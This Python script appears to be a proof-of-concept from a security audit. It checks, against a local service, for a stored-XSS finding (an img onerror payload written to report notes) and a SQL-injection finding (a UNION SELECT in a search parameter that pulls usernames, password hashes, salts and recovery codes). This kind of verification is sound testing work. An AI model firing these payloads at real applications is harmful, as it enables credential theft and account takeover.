"""
Live PoC Verification Script - FINDING-INP-002 (Stored XSS)
"""
import httpx, json

analyst_token = "wm_sec_token_ana_4210"
headers = {"Authorization": f"Bearer {analyst_token}", "Content-Type": "application/json"}
xss_payload = "<img src=x onerror=\"document.body.dataset.xss='POC_WM2026'\" />"

# Write the XSS payload to report notes
post_resp = httpx.post(
    "http://127.0.0.1:8001/api/reports/1/notes",
    json={"notes": xss_payload},
    headers=headers
)
print("[*] POST /api/reports/1/notes:", post_resp.status_code)

# Read it back to confirm persistence
get_resp = httpx.get("http://127.0.0.1:8001/api/reports/1", headers=headers)
body = get_resp.json()
notes = body.get("notes", "")

if xss_payload in notes:
    print("[+] FINDING-INP-002 CONFIRMED: Stored XSS payload persisted verbatim in database")
    print(f"    Stored notes value: {notes[:120]}")
else:
    print("[-] Payload not found (possibly already patched)")

# SQL Injection additional PoC
print()
sqli_payload = "' UNION SELECT 1,username,role,password_hash,salt,recovery_codes,1 FROM users WHERE '1'='1"
sqli_resp = httpx.get("http://127.0.0.1:8001/api/reports", params={"search": sqli_payload}, headers=headers)
if sqli_resp.status_code == 200:
    data = sqli_resp.json()
    print(f"[+] FINDING-INP-001 CONFIRMED: SQLi returned {len(data)} rows")
    for row in data[:3]:
        print(f"    Row: {json.dumps(row)[:150]}")
else:
    print("[-] SQLi test returned:", sqli_resp.status_code, sqli_resp.text[:100])
